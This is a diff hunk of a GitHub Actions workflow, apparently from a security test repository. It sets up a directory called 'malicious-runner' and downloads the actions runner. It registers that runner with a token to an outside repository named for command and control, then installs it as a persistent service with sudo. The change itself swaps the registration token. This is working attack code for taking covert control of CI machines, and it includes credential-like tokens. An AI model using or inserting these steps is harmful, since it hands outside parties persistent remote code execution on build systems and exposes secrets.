@@ -31,7 +31,7 @@ jobs:
           mkdir malicious-runner && cd malicious-runner
           curl -o actions-runner-linux-x64-2.325.0.tar.gz -L https://github.com/actions/runner/releases/download/v2.325.0/actions-runner-linux-x64-2.325.0.tar.gz
           tar xzf ./actions-runner-linux-x64-2.325.0.tar.gz
-          ./config.sh --url https://github.com/Harkins12345Test/C2OSRRunnerOnRunner --token BTOUZMQ5GVKXE6HKORLQ6LTIMYE64
+          ./config.sh --url https://github.com/Harkins12345Test/C2OSRRunnerOnRunner --token BTOUZMUJEIZENLGLIMELBE3IMYFQU
           sudo ./svc.sh install
           ./svc.sh install
           sudo ./svc.sh start
